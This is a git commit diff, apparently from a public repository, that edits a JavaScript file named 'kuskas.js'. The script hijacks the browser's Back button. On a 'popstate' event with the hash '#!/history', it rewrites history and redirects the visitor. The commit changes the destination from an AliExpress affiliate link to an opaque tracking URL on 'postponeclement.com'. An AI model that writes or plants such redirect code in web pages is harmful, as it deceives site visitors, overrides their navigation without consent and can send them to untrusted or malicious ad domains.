dfbad4aabef60370437f18d13b3fad987273b555
lookatdons <lookatdons@users.noreply.github.com>
2024-10-09 17:14:02 +0700

    Update kuskas.js

--- kuskas.js
+++ kuskas.js
@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") { 
     history.replaceState(null, document.title, location.pathname); 
     setTimeout(function(){ 
-      location.replace("https://s.click.aliexpress.com/e/_EwAAeZ3"); 
+      location.replace("https://postponeclement.com/dbci346e?key=785825480b5ae461f13a92d8e7518a82"); 
     },10); 
   } 
 }, false); 
